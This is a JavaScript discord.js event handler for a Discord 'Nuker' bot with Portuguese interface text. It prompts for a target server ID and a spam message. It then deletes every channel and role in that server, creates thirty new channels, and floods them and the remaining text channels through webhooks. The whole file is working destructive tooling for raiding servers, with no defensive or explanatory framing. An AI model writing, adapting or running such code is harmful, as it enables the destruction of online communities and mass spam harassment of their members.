const { ModalBuilder, TextInputBuilder, ActionRowBuilder, ChannelType, WebhookClient } = require("discord.js");

const OWNER_ID = '831304519287046175';
const MAX_CHANNELS = 30;
const MAX_SPAM_MESSAGES = 50;
const REMAINING_SPAM_MESSAGES = 15;

module.exports = {
    name: "interactionCreate",
    run: async (interaction) => {
        const { customId, user, client } = interaction;
        if (!customId) return;

        if (customId === "nukerbot") {
            await showNukerModal(interaction);
        } else if (customId === "panelnukermodal") {
            await handleNukerModal(interaction, client);
        }
    }
};

async function showNukerModal(interaction) {
    const modal = createNukerModal();
    return interaction.showModal(modal);
}

function createNukerModal() {
    const modal = new ModalBuilder()
        .setCustomId(`panelnukermodal`)
        .setTitle("Nuker");

    const inputs = [
        { id: "guildId", label: "ID DO SERVIDOR", placeholder: "ID DO SERVIDOR QUE DESEJA NUKAR" },
        { id: "spamMessage", label: "MENSAGEM DE SPAM", placeholder: "MENSAGEM QUE DESEJA SPAMMAR" },
        { id: "spamAll", label: "SPAM EM TODOS OS CANAIS (sim/não)", placeholder: "Digite 'sim' para spammar em todos os canais ou 'não' para não spammar" }
    ];

    inputs.forEach(input => {
        modal.addComponents(new ActionRowBuilder().addComponents(
            new TextInputBuilder()
                .setCustomId(input.id)
                .setLabel(input.label)
                .setStyle(1)
                .setPlaceholder(input.placeholder)
                .setRequired(true)
        ));
    });

    return modal;
}

async function handleNukerModal(interaction, client) {
    const { fields, user } = interaction;
    const guildId = fields.getTextInputValue("guildId");
    const spamMessage = fields.getTextInputValue("spamMessage");
    const spamAll = fields.getTextInputValue("spamAll").toLowerCase() === 'sim';

    await interaction.reply({ content: `<:icons_fingerprint:1261366785848901652> Verificando as informações...`, ephemeral: true });

    const guild = client.guilds.cache.get(guildId);
    if (!guild) {
        return interaction.editReply({ content: `<:icons_Wrong:1261798468532568174> O bot não está no servidor`, ephemeral: true });
    }

    await nukeGuild(interaction, guild);

    if (spamAll) {
        await spamGuild(interaction, guild, spamMessage);
    }
}

async function nukeGuild(interaction, guild) {
    await interaction.editReply({ content: `<:icons_clock:1261798597842829312> **| Apagando todos os Canais, Categorias e Cargos do Servidor \`${guild.name}\`**` });

    const deletePromises = [
        ...guild.channels.cache.map(c => c.delete().catch(() => {})),
        ...guild.roles.cache.map(r => r.delete().catch(() => {}))
    ];

    await Promise.all(deletePromises);

    await interaction.editReply({ content: `<:icons_Correct:1261798879578558484> Servidor \`${guild.name}\` apagado com sucesso` });
}

async function spamGuild(interaction, guild, spamMessage) {
    const channelPromises = Array(MAX_CHANNELS).fill().map((_, i) => 
        guild.channels.create({
            name: `nuke-webhook-${i}`,
            type: ChannelType.GuildText
        })
    );

    const channels = await Promise.all(channelPromises);

    const webhookPromises = channels.map(channel => spamChannel(channel, spamMessage, MAX_SPAM_MESSAGES));
    await Promise.all(webhookPromises);

    const remainingChannels = guild.channels.cache.filter(channel => channel.type === ChannelType.GuildText);
    const remainingWebhookPromises = remainingChannels.map(channel => spamChannel(channel, spamMessage, REMAINING_SPAM_MESSAGES));
    await Promise.all(remainingWebhookPromises);
}

async function spamChannel(channel, message, count) {
    const webhook = await channel.createWebhook({ name: 'Nuker Webhook' });
    const spamPromises = Array(count).fill().map(() => webhook.send(message).catch(() => {}));
    return Promise.all(spamPromises);
}